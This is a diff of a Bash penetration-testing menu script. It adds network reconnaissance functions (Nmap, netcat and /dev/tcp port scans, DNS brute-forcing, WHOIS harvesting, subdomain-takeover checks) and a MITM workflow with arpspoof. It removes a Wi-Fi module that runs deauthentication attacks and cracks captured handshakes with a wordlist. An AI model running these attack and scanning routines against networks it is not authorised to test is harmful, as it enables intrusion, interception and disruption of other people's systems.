-            echo -e "${MAGENTA} [4] Exit to Main Menu${RESET}"
-            echo
-            echo -ne "${GREEN} Choose an option: ${RESET}"
-            read -r option
-            echo
-            case $option in
-                0) generate_reset_steps ;;
-                1) generate_qr_code ;;
-                2) print_instructions ;;
-                3) print_in_screen ;;
-                4) main ;;
-                *) echo -e "${RED} Invalid choice.${RESET}"; go_back ;;
-            esac
+        # Function to clean up and restore system settings
+        function cleanup() {
+            echo -e "${RED} Stopping attack and restoring system settings...${RESET}"
+            pkill -f arpspoof
+            pkill -f tcpdump
+            macchanger -p "$INTERFACE"  # Restore the original MAC address
+            echo "${GREEN} >>> Cleanup complete. <<<${RESET}"
         }
 
-        # Main Execution
-        submenu_linux_root_password_reset
+        # Function to run the full MiTM attack workflow
+        function main_mitm() {
+            display_banner_inside_functions                 # Call the header function
+            trap cleanup EXIT  # Ensure cleanup runs on script exit
+            check_dependencies       # Verify required tools are installed
+            identify_attack_environment  # Detect attack network and interface
+            display_attack_info      # Display attack setup information
+            enable_packet_forwarding # Enable system packet forwarding
+            setup_mitm_environment   # Configure MITM attack environment
+            exit_to_main_menu        # Return to the main menu
+        }
+
+        # Execute the MiTM attack workflow
+        main_mitm
     }
 
-    # Function: Quick Reference Guide for Vim Commands
-    function vim_quick_reference() {
-        # vim_quick_reference - Quick Reference Guide for Vim Commands
+    # Function: Nmap Network Discovery
+    function nmap_network_discovery() {
+        # Function: Nmap Network Discovery  
             #
             # Description:
-            #   This script provides a quick reference for essential Vim commands,
-            #   covering navigation, editing, saving, and common operations.
+            #   This script automates active network reconnaissance using Nmap.
+            #   It enables the operator to select a network interface, scan all ports,  
+            #   and save results for further analysis.
             #
             # Features:
-            #   - Covers essential commands for inserting, saving, and exiting Vim
-            #   - Includes text navigation, deletion, undo/redo, search, and replace
-            #   - Provides an easy-to-read guide with structured formatting
+            #   - **Interactive Interface Selection**: Choose the target network dynamically.
+            #   - **Comprehensive Scanning**: Full TCP scan (-sS -p-), aggressive timing (-T5).
+            #   - **Automated Logging**: Stores scan results in structured logs.
             #
             # Usage:
-            #   Run this script to display a quick reference for using Vim.
+            #   Run this function to map the attack surface of a target network.
             #
             # Author: R3v4N (w/GPT)
-            # Created on: 2025-01-26
-            # Last Updated: 2025-01-30
-            # Version: 2.0
+            # Created on: 2025-01-30
+            # Last Updated: 2025-01-31
+            # Version: 2.2
             #
             # Notes:
-            #   - This is NOT a full Vim tutorial but a **rapid cheat sheet**.
-            #   - Useful for Red Team operations, forensics, and system admins.
+            #   - **Red Team Focused**: Ideal for network reconnaissance & footprinting.
+            #   - **Requires root privileges** for full Nmap functionality.
+            #   - **Stealth considerations**: The aggressive timing (-T5) may trigger IDS/IPS.
 
-        title="VIM QUICK REFERENCE" # Title
 
-        function display_vim_header() {
-            display_banner_inside_functions
-        }
+        title="NMAP NETWORK DISCOVERY"
 
-        function vim_text_insertion() {
-            echo -e "${YELLOW}Text Insertion:${RESET}"
-            echo -e "Press 'i' to enter INSERT mode."
-        }
-
-        function vim_save_exit() {
-            echo -e "\n${YELLOW}Saving and Exiting:${RESET}"
-            echo -e "Press 'Esc' to exit INSERT mode, then type ':wq' to save and quit."
-        }
-
-        function vim_exit_without_saving() {
-            echo -e "\n${YELLOW}Exit Without Saving:${RESET}"
-            echo -e "Press 'Esc' to exit INSERT mode, then type ':q!' to quit without saving."
-        }
-
-        function vim_navigation() {
-            echo -e "\n${YELLOW}Navigation:${RESET}"
-            echo -e "Use arrow keys or 'h' (left), 'j' (down), 'k' (up), 'l' (right)."
-        }
-
-        function vim_delete_text() {
-            echo -e "\n${YELLOW}Deleting Text:${RESET}"
-            echo -e "Press 'x' to delete the character under the cursor."
-        }
-
-        function vim_undo_redo() {
-            echo -e "\n${YELLOW}Undo & Redo:${RESET}"
-            echo -e "Press 'u' to undo. Press 'Ctrl + r' to redo."
-        }
-
-        function vim_search_replace() {
-            echo -e "\n${YELLOW}Search & Replace:${RESET}"
-            echo -e "Type '/' to search. Use ':s/old/new/g' to replace all instances."
-        }
-
-        function vim_help() {
-            echo -e "\n${YELLOW}Help:${RESET}"
-            echo -e "Type ':help' for more detailed documentation."
-        }
-
-        function display_vim_footer() {
-            echo -e "\n${GREEN}===================================================${RESET}"
+        function select_network() {
+            echo -e " === Available Network Interfaces ==="
             echo
+            ip -br a | awk '{print NR ") " $1 " - " $3}'
+            echo
+
+            read -r -p "Enter the number of the interface to scan: " interface_num
+            total_interfaces=$(ip -br a | wc -l)
+
+            # Validate user input
+            if [[ ! "$interface_num" =~ ^[0-9]+$ ]] || ((interface_num < 1 || interface_num > total_interfaces)); then
+                echo -e "Invalid interface number. Please try again."
+                pause_script
+                nmap_discovery_workflow
+            fi
+
+            selected_network=$(ip -br a | awk "NR==$interface_num {print \$3}")
+
+            if [[ -z "$selected_network" ]]; then
+                echo -e "Failed to retrieve network details. Exiting..."
+                exit 1
+            fi
+
+            NETWORK=$(ipcalc -n -b "$selected_network" | awk '/Network/ {print $2}')
         }
 
-        # Execute all functions in order
-        function vim_quick_reference_workflow() {
-            display_vim_header
-            vim_text_insertion
-            vim_save_exit
-            vim_exit_without_saving
-            vim_navigation
-            vim_delete_text
-            vim_undo_redo
-            vim_search_replace
-            vim_help
-            display_vim_footer
+        function execute_nmap_scan() {
+            LOG_DIR="./logs"
+            if [ ! -d "$LOG_DIR" ]; then
+                mkdir -p "$LOG_DIR"
+            fi
+            LOG_FILE="${LOG_DIR}/nmap_$(date +%d%m%Y_%H%M%S).log"
+            echo -e "Starting Nmap Scan on $NETWORK..."
+            echo
+            nmap -sS -p- -T5 "$NETWORK" -oG "$LOG_FILE" #
+            echo
+            echo -e " Scan completed. Results saved in: $LOG_FILE"
+        }
+
+        function nmap_discovery_workflow() {
+            display_banner_inside_functions
+            select_network
+            execute_nmap_scan
             exit_to_main_menu
         }
 
-        # Start the Vim usage reminder workflow
-        vim_quick_reference_workflow
+        nmap_discovery_workflow
+    }
+
+    # Function: Script to analyze subdomains and WHOIS information for a website or a list of websites.
+    function parsing_html() {
+        # parsing_html - Script to analyze subdomains and WHOIS information for a website or a list of websites.
+            #
+            # Description:
+            # This script performs the following operations:
+            # 1. Extracts subdomains from an HTML page.
+            # 2. Retrieves IP addresses associated with each subdomain.
+            # 3. Fetches WHOIS information for each domain.
+            # 4. Generates a report with the results.
+            #
+            # Dependencies:
+            # - curl: To make HTTP requests.
+            # - dig: To retrieve IP addresses of subdomains.
+            # - whois: To get WHOIS information for domains.
+            # - nslookup: For DNS lookups.
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2024-01-15
+            # Last Updated: 2024-01-24
+            # Version: 1.1
+            #
+            # Version history:
+            # - 1.0 (2024-01-15): Initial version with basic subdomain and WHOIS functionality.
+            # - 1.1 (2024-01-24): Added dependency checks and updated timestamp format.
+            #
+            # Example usage:
+            # - Input: https://example.com
+            # - Output: Subdomains, IP addresses, WHOIS information for each domain.
+            #
+            # Notes:
+            # - Ensure the dependencies are installed before running the script.
+            # - The report is saved in a file named "result_<URL>_<date>.txt".
+            #
+
+        # Function to check if dependencies are installed
+        check_dependencies() {
+            local dependencies=("curl" "whois" "nslookup" "dig")
+            for dep in "${dependencies[@]}"; do
+                if ! command -v "$dep" &>/dev/null; then
+                    echo -e "${RED}Error: Dependency '$dep' is not installed.${RESET}"
+                    echo "Please install '$dep' before running this script."
+                    exit 1
+                fi
+            done
+        }
+
+        # Call the dependency check function
+        check_dependencies
+
+        # Prompt the user to input the desired website URL
+        echo -n "Enter the URL of the website to analyze (e.g.: businesscorp.com.br): "
+        read -r SITE
+
+        # Store the current date and time in the specified format (day-hour-minutes-month-year)
+        timestamp=$(date +"%d%H%M%b%Y" | tr '[:lower:]' '[:upper:]') # Example: 241408JAN2024
+        output_file="result_${SITE}_${timestamp}.txt"
+
+        # Function to print text in color
+        print_color() {
+            local color=$1
+            local text=$2
+            echo -e "\e[0;${color}m${text}\e[0m"
+        }
+
+        # Function to extract subdomains from an HTML page
+        extract_subdomains() {
+            local site=$1
+            curl -s "$site" | grep -Eo '(http|https)://[^/"]+' | awk -F[/:] '{print $4}' | sort -u
+        }
+
+        # Function to get the IP address of a subdomain
+        get_ip_address() {
+            local subdomain=$1
+            local ip_address
+            ip_address=$(host "$subdomain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1)
+            echo "$ip_address:$subdomain"
+        }
+
+        # Function to get WHOIS information for a domain
+        get_whois_info() {
+            local domain=$1
+            whois "$domain" | grep -vE "^\s*(%|\*|;|$|>>>|NOTICE|TERMS|by|to)" | grep -E ':|No match|^$'
+        }
+
+        # Function to get DNS lookup information for a domain
+        get_dns_info() {
+            local domain=$1
+            nslookup "$domain" 2>/dev/null | grep "Address" | awk '{print $2}' | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/, /g'
+        }
+
+        # Add the timestamp to the beginning of the output file
+        echo -e "Report generated on: $timestamp\n" > "$output_file"
+
+        # Analyze the provided site
+        print_color 33 "Analyzing subdomains for: $SITE"
+        subdomains=($(extract_subdomains "$SITE"))
+
+        # Check if any subdomains were found
+        if [ ${#subdomains[@]} -eq 0 ]; then
+            print_color 31 "No subdomains found for: $SITE"
+            echo "No subdomains found for: $SITE" >> "$output_file"
+        else
+            print_color 32 "Subdomains found:"
+            for subdomain in "${subdomains[@]}"; do
+                print_color 36 "$subdomain"
+
+                # Get IP address for the subdomain
+                ip_result=$(get_ip_address "$subdomain")
+                echo "$ip_result" >> "$output_file"
+
+                # Add WHOIS information
+                print_color 34 "WHOIS information for $subdomain"
+                get_whois_info "$subdomain" >> "$output_file"
+
+                # Add DNS lookup information
+                print_color 34 "DNS Lookup information for $subdomain"
+                get_dns_info "$subdomain" >> "$output_file"
+
+                echo -e "\n" >> "$output_file"
+            done
+        fi
+
+        # Completion message
+        print_color 32 "Analysis complete. Results saved to: $output_file"
+        echo -e "${GRAY}Press ENTER to continue${RESET}"
+        read -r 2>/dev/null
+        main_menu
+    }
+
+    # Function: Script to perform a port scan on a network using netcat
+    function portscan() {
+        # i_portscan - Script to perform a port scan on a network using netcat
+            #
+            # Description:
+            # This script performs the following operations:
+            # 1. Checks for common open ports on all hosts within a specified IP range (CIDR format).
+            # 2. Dynamically loads a user-defined number of top ports (e.g., 20, 100, 1000) from Nmap's services file, if available.
+            # 3. Falls back to a predefined list of common ports if Nmap's file is unavailable.
+            # 4. Prints results for each host and open port found.
+            # 5. Saves the results in two file formats:
+            #    - Plain text (`portscan_results.txt`) for human-readable output.
+            #    - CSV (`portscan_results.csv`) for structured data analysis.
+            #
+            # Dependencies:
+            # - netcat (nc): To perform the port scanning.
+            # - ipcalc: To validate and parse CIDR-based network masks.
+            # - awk: To process data from Nmap's services file.
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2025-01-23
+            # Last Updated: 2025-01-24
+            # Version: 1.2
+            #
+            # Version history:
+            # - 1.0 (2025-01-23): Initial version with basic port scanning functionality.
+            # - 1.1 (2025-01-23): Added support for saving results in `.txt` and `.csv` formats.
+            #                     Integrated dynamic port loading from Nmap's services file.
+            # - 1.2 (2025-01-23): Added user input to define the number of top ports to scan.
+            #                     Improved flexibility and user control over scan depth.
+            #
+            # Notes:
+            # - Ensure the required dependencies are installed before running the script.
+            # - If `ipcalc` is not installed, the script will attempt to install it automatically.
+            # - Users can dynamically select the number of top ports to scan.
+            # - Results are saved in the current working directory as `portscan_results.txt` and `portscan_results.csv`.
+            # - Handles Ctrl+C interruptions gracefully and returns to the main menu.
+            #
+            # Example usage:
+            # - Input:
+            #   - Number of ports: 100
+            #   - CIDR: "192.168.1.0/24"
+            # - Output:
+            #   - Terminal: "Host: 192.168.1.1 - Open Port: 80"
+            #   - Text File: "Host: 192.168.1.1 - Open Port: 80"
+            #   - CSV File: "192.168.1.1,80,Open"
+
+        clear
+        echo -e "${MAGENTA}1 - Portscan using netcat ${RESET}"
+        echo -e "${GRAY}+======================================================================+${RESET}"
+        echo -e "${GRAY}This port scan checks common open ports on all hosts in the network."
+        echo -e "${GRAY}+======================================================================+${RESET}"
+
+        # Ask the user how many top ports they want to scan
+        echo -ne "${CYAN}Enter the number of top ports to scan (e.g., 20, 100, 1000): ${RESET}"
+        read -r TOP_PORTS
+
+        # Validate the user's input (ensure it's a positive number)
+        if ! [[ "$TOP_PORTS" =~ ^[0-9]+$ ]] || [[ "$TOP_PORTS" -le 0 ]]; then
+            echo -e "${RED}Invalid input! Please enter a positive number.${RESET}"
+            main_menu
+            return
+        fi
+
+        # Load ports dynamically from Nmap or use a fallback list
+        local nmap_services="/usr/share/nmap/nmap-services" # Path to Nmap's services file
+        local fallback_ports="80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900"
+
+        if [[ -f "$nmap_services" ]]; then
+            # Extract the top N ports based on the user's choice
+            PORT_LIST=$(awk '!/^#/ {print $2}' "$nmap_services" | grep -Eo '^[0-9]+' | sort -n | uniq | head -n "$TOP_PORTS" | paste -sd ',')
+
+            if [[ -n "$PORT_LIST" ]]; then
+                echo -e "${GREEN}Loaded the TOP $TOP_PORTS ports from Nmap's services file: $nmap_services${RESET}"
+            else
+                echo -e "${YELLOW}Warning: Failed to extract ports from Nmap's services file. Falling back to predefined ports.${RESET}"
+                PORT_LIST="$fallback_ports"
+            fi
+        else
+            echo -e "${YELLOW}Warning: Nmap services file not found at $nmap_services. Falling back to predefined ports.${RESET}"
+            PORT_LIST="$fallback_ports"
+        fi
+
+        # Handle Ctrl+C interruptions gracefully
+        trap 'echo -e "\nScript interrupted by user."; main_menu; exit 1' SIGINT
+
+        # Ask user to enter the IP range in CIDR notation
+        echo -ne "${CYAN}Enter the IP range in CIDR notation (e.g., 192.168.1.0/24): ${RESET}"
+        read -r NETWORK_MASK
+
+        # Validate the network mask
+        if ! ipcalc -n -b -m "$NETWORK_MASK" >/dev/null 2>&1; then
+            echo "Invalid network mask."
+            main_menu
+            return
+        fi
+
+        # Extract the network prefix from the mask
+        NETWORK_PREFIX=$(ipcalc -n -b "$NETWORK_MASK" | awk '/Network/ {print $2}' | awk -F. '{print $1"."$2"."$3}')
+
+        # Start scanning each host in the network for the specified ports
+        echo -e "${CYAN}Scanning network: $NETWORK_MASK ${RESET}"
+        for HOST in $(seq 1 254); do
+            IP="$NETWORK_PREFIX.$HOST"
+            for PORT in $(echo "$PORT_LIST" | tr ',' ' '); do
+                # Check if the port is open on the host
+                nc -z -w 1 "$IP" "$PORT" 2>/dev/null
+                if [ $? -eq 0 ]; then
+                    echo -e "${GREEN}Host: $IP - Open Port: $PORT ${RESET}"
+                fi
+            done
+        done
+
+        # Completion message
+        echo -e "${GREEN}Scan completed for $NETWORK_MASK using the TOP $TOP_PORTS ports.${RESET}"
+        echo -e "${GRAY}Press ENTER to continue...${RESET}"
+        read -r
+        main
+    }
+
+    # Function: Perform a Bash-based TCP port scan
+    function portscan_bashsocket(){
+        # Function: x_portscan_bashsocket - Perform a Bash-based TCP port scan
+            #
+            # Description:
+            # This script performs a port scan on a specified target using Bash sockets.
+            # It checks for open TCP ports within a given range.
+            #
+            # Dependencies:
+            # - Bash with TCP socket support (`/dev/tcp/`)
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2025-01-25
+            # Last Updated: 2025-01-25
+            # Version: 1.3
+            #
+            # Notes:
+            # - This script is intended for ethical testing only.
+            # - Use responsibly and ensure you have permission before scanning any target.
+
+        title="Bash Socket Port Scanner"  # Define the title for this operation
+        # Function to validate IPv4 address or hostname
+        LOG_DIR="./scan_logs"  # Directory for logs
+        mkdir -p "$LOG_DIR"  # Ensure log directory exists
+
+        # Function to validate IPv4 address or hostname
+        function validate_target() {
+            local target="$1"
+            if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+                return 0  # Valid IPv4
+            elif [[ "$target" =~ ^[a-zA-Z0-9.-]+$ ]]; then
+                return 0  # Valid hostname
+            else
+                echo -e "${RED}Error: Invalid target entered. Please enter a valid IP or hostname.${RESET}"
+                return 1
+            fi
+        }
+
+        # Function to scan a single port (with timeout) and log results
+        function scan_port() {
+            local target="$1"
+            local port="$2"
+            local log_file="$3"
+
+            if timeout 1 bash -c "exec 3<>/dev/tcp/$target/$port" 2>/dev/null; then
+                echo -e "${MAGENTA} Port $port -> ${GREEN}[OPEN] ${RESET}" | tee -a "$log_file"
+            fi
+        }
+
+        # Function to perform port scanning with logging
+        function perform_port_scan() {
+            local target="$1"
+            local start_port="$2"
+            local end_port="$3"
+            local log_file="${LOG_DIR}/scan_${target}_$(date +%d%m%Y_%H%M%S).log"
+            local max_parallel_jobs=100  # Allow more parallel scans without freezing
+
+            echo -e "${GREEN}-----------------------------------------------------${RESET}"
+            echo -e " Scanning target: ${YELLOW}$target${RESET} (Ports: $start_port-$end_port)"
+            echo -e "${GREEN}-----------------------------------------------------${RESET}"
+            echo -e "${GREEN} Port scan log for ${YELLOW}$target (Scanned on $(date))${RESET}" > "$log_file"
+
+            for ((port=start_port; port<=end_port; port++)); do
+                scan_port "$target" "$port" "$log_file" &
+
+                # Control number of parallel jobs to prevent system overload
+                if (( $(jobs -p | wc -l) >= max_parallel_jobs )); then
+                    wait -n  # Wait for at least one job to finish before spawning new ones
+                fi
+            done
+
+            wait  # Ensure all remaining jobs finish
+            echo -e "\n${CYAN} Scan complete. Log saved to: $log_file ${RESET}"
+
+        }
+
+        function user_input(){
+            # Get user input for target
+            while true; do
+                echo -ne "${RED} Enter target IP or domain: ${RESET}"
+                read -r target
+                validate_target "$target" && break
+            done
+
+            # Get user input for port range
+            echo -ne "${RED} Enter start port (default: 1): ${RESET}"
+            read -r start_port
+            start_port=${start_port:-1}  # Default to 1 if empty
+
+            echo -ne "${RED} Enter end port (default: 65535): ${RESET}"
+            read -r end_port
+            end_port=${end_port:-65535}  # Default to 65535 if empty
+
+            # Validate port numbers
+            if [[ ! "$start_port" =~ ^[0-9]+$ ]] || [[ ! "$end_port" =~ ^[0-9]+$ ]] || ((start_port > end_port)); then
+                echo -e "${RED} >>> Error: Invalid port range. Please enter valid numbers. <<< ${RESET}"
+                return
+            fi
+
+            export target start_port end_port
+
+        }
+
+        # Function to run the port scan workflow
+        function portscan_workflow() {
+            clear; # clear terminal
+            display_banner_inside_functions; 
+            user_input;
+            perform_port_scan "$target" "$start_port" "$end_port" # Start the scan
+            exit_to_main_menu; # Return to main menu
+        }
+
+        # Execute port scan function
+        portscan_workflow;
     }
 
     # Function: Quick Reference for Escaping Restricted Bash (rbash)
@@ -2965,114 +2580,466 @@ RELEASE="ANAKIN"
         rbash_escape_workflow
     }
 
-    # Function: Wireless Penetration Testing Toolkit
-    function wireless_pentest() {
-        # wireless_pentest - Conducts penetration testing on Wi-Fi networks
+    # Function: Perform DNS reconnaissance on a target domain using a subdomain wordlist
+    function recon_dns() {
+        # viii_recon_dns - Perform DNS reconnaissance on a target domain using a subdomain wordlist
             #
             # Description:
-            #   Automates various attacks and reconnaissance techniques on wireless networks.
-            #   Features include monitor mode activation, handshake capture, deauthentication, and password cracking.
-            #
-            # Features:
-            #   - Enables monitor mode & MAC spoofing
-            #   - Captures network traffic & handshake authentication
-            #   - Conducts deauthentication attacks on clients
-            #   - Cracks captured handshakes using wordlists
-            #
-            # Output:
-            #   - Saves logs for further analysis
-            #
-            # Author: Z1GSN1FF3R || R3v4N || 0wL (Refactored w/GPT)
-            # Created on: 2021-01-27
-            # Last Updated: 2025-01-30
-            # Version: 2.0
-            #
-            # Usage:
-            #   Run this function to perform a full wireless penetration test.
+            # This script automates DNS reconnaissance by iterating through a list of subdomains
+            # and performing DNS queries to identify active subdomains. The results are saved in
+            # a timestamped file for later analysis.
             #
             # Notes:
-            #   - Requires root privileges
-            #   - Use responsibly & ethically
-            #   - Ensure you have permission before testing any network
+            # - Requires the `host` command to perform DNS queries.
+            # - The script uses a predefined wordlist located at `/usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt`.
+            # - Displays progress to the user during execution.
+            #
+            # Example usage:
+            # - Input:
+            #   - Target domain: businesscorp.com.br
+            # - Output:
+            #   - File `dns_recon_businesscorp.com.br_<timestamp>.txt` containing active subdomains.
+            #
+            # Created on: 2025-01-26
+            # Last Updated: 2025-01-26
+            # Version: 1.1
+            #
+            # Author: R3v4N (w/GPT)
+            #
 
-        title="WIRELESS PENETRATION TESTING TOOLKIT"  # Title
+        local title="DNS Reconnaissance"  # Define the title for this operation
 
-        # Function: Disable monitor mode if active
-        function disable_monitor_mode() {
-            log_and_display "=== Stopping monitor mode ==="
-            airmon-ng stop mon0 2>/dev/null
+        # Function to load and count the total lines in the subdomain wordlist
+        function load_wordlist() {
+                WORDLIST="/usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt"  # Path to the wordlist
+                if [[ ! -f "$WORDLIST" ]]; then
+                    echo -e "${RED}Error: Wordlist not found at $WORDLIST.${RESET}"
+                    echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
+                    read -r 2>/dev/null
+                    main_menu
+                    return 1
+                fi
+                TOTAL_LINES=$(wc -l "$WORDLIST" | awk '{print $1}')  # Count the total lines
+            }
+
+            # Function to prompt the user for the target domain
+            function prompt_user_inputs() {
+                echo -en "${CYAN} Enter the target domain (e.g., businesscorp.com.br): ${RESET}"
+                read -r DOMAIN  # Read the domain input from the user
+            }
+
+            # Function to prepare the output file
+            function prepare_output_file() {
+                TIMESTAMP=$(date +%d%H%M%b%Y)  # Generate a timestamp
+                OUTPUT_FILE="dns_recon_${DOMAIN}_${TIMESTAMP}.txt"  # Define the output file name
+
+                rm -rf "$OUTPUT_FILE"  # Remove the file if it exists
+                touch "$OUTPUT_FILE"  # Create a new empty file
+            }
+
+            # Function to perform DNS reconnaissance
+            function perform_dns_recon() {
+                LINE_COUNT=0  # Initialize the line counter
+
+                echo -e "${YELLOW} Starting DNS reconnaissance for: $DOMAIN ${RESET}"
+                for SUBDOMAIN in $(cat "$WORDLIST"); do
+                    ((LINE_COUNT++))  # Increment the line counter
+
+                    # Query the DNS for the current subdomain and append results to the output file
+                    host "$SUBDOMAIN.$DOMAIN" >> "$OUTPUT_FILE"
+
+                    # Display the progress
+                    echo -e "${CYAN}-------- Searching ---------> $LINE_COUNT/$TOTAL_LINES ${RESET}"
+                done
         }
 
-        # Function: Display available wireless interfaces
-        function list_available_interfaces() {
-            log_and_display "=== Available Wireless Interfaces ==="
-            airmon-ng
+        # Function to display results
+        function display_results() {
+            echo -e "${GREEN} DNS reconnaissance results saved to: $OUTPUT_FILE ${RESET}"
+            echo -e "${CYAN}=== Results Preview ===${RESET}"
+            head -n 10 "$OUTPUT_FILE"  # Display the first 10 lines as a preview
+            echo -e "${YELLOW}... (Full results available in the output file) ${RESET}"
         }
 
-        # Function: Enable monitor mode & spoof MAC address
-        function configure_monitor_mode() {
-            log_and_display "=== Configuring Monitor Mode ==="
-            ifconfig "$INTERFACE" down
-            iw dev "$INTERFACE" interface add mon0 type monitor
-            macchanger -r mon0
-            airmon-ng check kill  # Kill interfering processes
+        # Main workflow for DNS reconnaissance
+        function dns_recon_workflow() {
+            display_banner_inside_functions;
+            load_wordlist || return  # Load the wordlist and validate its existence
+            prompt_user_inputs  # Prompt the user for inputs
+            prepare_output_file  # Prepare the output file
+            perform_dns_recon  # Perform DNS reconnaissance
+            display_results  # Display the results to the user
+            exit_to_main_menu # Exit the script and return to the main menu
         }
 
-        # Function: Passive network monitoring
-        function passive_network_monitoring() {
-            local timestamp
-            timestamp=$(date +"%d%H%M%b%y")
-            log_and_display "=== Starting Passive Network Monitoring ==="
-            airodump-ng mon0 --write "monitoring_log_$timestamp"
+        # Execute the main workflow
+        dns_recon_workflow
+    }
+
+    # Function: Perform Reverse DNS Lookup for a specified range of IP addresses
+    function rev_dns() {
+        # vii_rev_dns - Perform Reverse DNS Lookup for a specified range of IP addresses
+            #
+            # Description:
+            # This script automates a reverse DNS lookup operation for a range of IP addresses.
+            # It performs the following operations:
+            # 1. Prompts the user for the base address and IP range.
+            # 2. Iterates over the specified range and queries DNS for PTR records.
+            # 3. Saves the results to a timestamped file and displays the output to the user.
+            #
+            # Notes:
+            # - Requires the `host` command to perform DNS lookups.
+            # - Output is saved in a timestamped file for reference.
+            # - Designed for educational purposes; ensure proper permissions for testing.
+            #
+            # Example usage:
+            # - Input:
+            #   - Base address: 192.168.0
+            #   - Range: Start = 1, End = 10
+            # - Output:
+            #   - PTR records for IPs 192.168.0.1 through 192.168.0.10.
+            #
+            # Created on: 2025-01-26
+            # Last Updated: 2025-01-26
+            # Version: 1.1
+            #
+            # Author: R3v4N (w/GPT)
+            #
+
+        local title="Reverse DNS Lookup"  # Define the title for this operation
+
+        # Function to prompt the user for inputs
+        function prompt_user_inputs() {
+            
+            echo -en " Enter the base address (e.g., 192.168.0): ${RESET}"
+            read -r BASE_ADDRESS  # Read the base address from the user
+
+            echo -en " Enter the start of the IP range: ${RESET}"
+            read -r START  # Read the start of the IP range
+
+            echo -en " Enter the end of the IP range: ${RESET}"
+            read -r END  # Read the end of the IP range
         }
 
-        # Function: Targeted AP scanning
-        function scan_target_ap() {
-            log_and_display "=== Scanning Target Access Point ==="
-            read -r -p "Enter Target AP BSSID (MAC Address): " MACTARGET
-            read -r -p "Enter Target AP Channel: " CHANNEL
-            airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_log
+        # Function to prepare the output file
+        function prepare_output_file() {
+            TIMESTAMP=$(date +%d%H%M%b%Y)  # Generate a timestamp
+            OUTPUT_FILE="${BASE_ADDRESS}.${START}-${END}_${TIMESTAMP}.txt"  # Define the output file name
+
+            rm -rf "$OUTPUT_FILE"  # Remove the file if it exists
+            touch "$OUTPUT_FILE"  # Create a new empty file
         }
 
-        # Function: Capture WPA/WPA2 handshake
-        function capture_handshake() {
-            log_and_display "=== Capturing 4-Way Handshake ==="
-            tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write handshake_log &
-        }
-
-        # Function: Conduct deauthentication attack
-        function deauthentication_attack() {
-            log_and_display "=== Deauth Attack: Disconnecting Clients ==="
-            read -r -p "Enter Client MAC to Deauthenticate: " CLIENTMAC
-            for ((i=1; i<=3; i++)); do
-                aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLIENTMAC" mon0 | tee -a deauth_log
-                log_and_display "Sleeping 5 seconds between attacks..."
-                sleep 5
+        # Function to perform reverse DNS lookups
+        function perform_reverse_dns() {
+            echo -e "${YELLOW} Performing reverse DNS lookups for range: ${BASE_ADDRESS}.${START}-${END} ${RESET}"
+            for RANGE in $(seq "$START" "$END"); do
+                # Query the PTR record and filter the result
+                host -t ptr "${BASE_ADDRESS}.${RANGE}" \
+                    | cut -d ' ' -f5 \
+                    | grep -v '.ip-' >> "$OUTPUT_FILE"
             done
         }
 
-        # Function: Crack WPA/WPA2 handshake with wordlist
-        function crack_handshake() {
-            log_and_display "=== Cracking Captured Handshake ==="
-            aircrack-ng handshake_log*.cap -w /usr/share/wordlists/rockyou.txt
+        # Function to display results
+        function display_results() {
+            echo -e "${GREEN} Reverse DNS lookup results saved to: $OUTPUT_FILE ${RESET}"
+            echo -e "${CYAN}=== Results ===${RESET}"
+            cat "$OUTPUT_FILE"  # Display the contents of the output file
         }
 
-        # Execution Workflow
-        function wireless_pentest_workflow() {
+        # Main workflow for the reverse DNS lookup
+        function reverse_dns_workflow() {
+            
+            display_banner_inside_functions;  # Display the sub-menu for Reverse DNS Lookup
+            prompt_user_inputs  # Prompt the user for inputs
+            prepare_output_file  # Prepare the output file
+            perform_reverse_dns  # Perform reverse DNS lookups
+            display_results  # Display the results to the user
+            exit_to_main_menu; # Exit the script and return to the main menu
+        }
+
+        # Execute the main workflow
+        reverse_dns_workflow
+    }
+
+    # Function: Perform a Subdomain Takeover check
+    function Subdomain_takeover() {
+        # vi_Subdomain_takeover - Perform a Subdomain Takeover check
+            #
+            # Description:
+            # This script automates the process of detecting potential Subdomain Takeover vulnerabilities.
+            # It works by:
+            # 1. Prompting the user to input the target domain and a file containing subdomains to test.
+            # 2. Iterating over each subdomain in the provided file.
+            # 3. Checking the CNAME records of each subdomain to identify potential takeovers.
+            #
+            # Dependencies:
+            # - `host`: Used to query CNAME records for subdomains.
+            #
+            # Notes:
+            # - Ensure you have the proper permissions and ethical clearance before testing any domain.
+            # - The file containing subdomains should have one subdomain per line.
+            #
+            # Example usage:
+            # - Input: Target domain: example.com
+            #         Subdomain file: subdomains.txt
+            # - Output: Lists any subdomains with a CNAME record that indicates a possible takeover vulnerability.
+            #
+            # Example result:
+            # - Subdomain: vulnerable.example.com
+            #   CNAME: alias-for-unused-service.s3.amazonaws.com
+            #
+            # Created on: 2025-01-26
+            # Last Updated: 2025-01-26
+            # Version: 1.0
+            #
+            # Author: R3v4N (w/GPT)
+            #
+        
+        
+        # Function: Collect user inputs
+        function collect_inputs() {
+            clear;  # Clear the terminal screen for clean output
+            ascii_banner_art;  # Display ASCII art banner
+            echo -e "${MAGENTA} Subdomain Takeover ${RESET}"
+            subtitle;  # Display a subtitle
+
+            # Prompt for the target domain
+            echo -en "${CYAN} Enter the target domain (e.g., example.com): ${RESET}"
+            read -r HOST  # Store the target domain in the HOST variable
+
+            # Prompt for the file containing subdomains
+            echo -en "${CYAN} Enter the file containing subdomains (one per line): ${RESET}"
+            read -r FILE  # Store the file path in the FILE variable
+
+            # Validate that the file exists and is not empty
+            if [[ ! -f "$FILE" || ! -s "$FILE" ]]; then
+                echo -e "${RED} Error: The specified file does not exist or is empty. ${RESET}"
+                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
+                read -r 2> /dev/null
+                main_menu
+                return 1
+            fi
+        }
